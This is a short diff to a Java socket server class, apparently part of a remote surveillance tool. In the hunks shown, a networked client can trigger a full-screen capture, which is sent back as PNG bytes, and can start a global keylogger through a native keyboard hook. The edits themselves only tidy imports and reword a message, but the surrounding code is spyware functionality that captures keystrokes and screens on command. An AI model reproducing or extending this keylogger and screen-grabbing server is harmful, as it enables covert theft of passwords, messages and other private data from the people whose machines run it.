@@ -1,9 +1,7 @@
 import java.io.*;
-import java.lang.annotation.Native;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.util.List;
-import java.net.http.WebSocket;
 
 import java.awt.*;
 import java.awt.image.BufferedImage;
@@ -91,10 +89,8 @@ public class Server implements NativeKeyListener {
                         Robot robot = new Robot();
                         Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
                         BufferedImage screenshot = robot.createScreenCapture(screenRect);
-
                         ByteArrayOutputStream baos = new ByteArrayOutputStream();
                         ImageIO.write(screenshot, "png", baos);
-
                         byte[] screenshotBytes = baos.toByteArray();
                         baos.close();
                         writer.println(screenshotBytes.length);
@@ -107,7 +103,7 @@ public class Server implements NativeKeyListener {
                 } else if (request.equals("start-keylogger")) {
                     try {
                         GlobalScreen.registerNativeHook();
-                        writer.println("Start Keylogger");
+                        writer.println("A keylogger has been started.");
                         writer.flush();
                     }
                     catch (NativeHookException ex) {
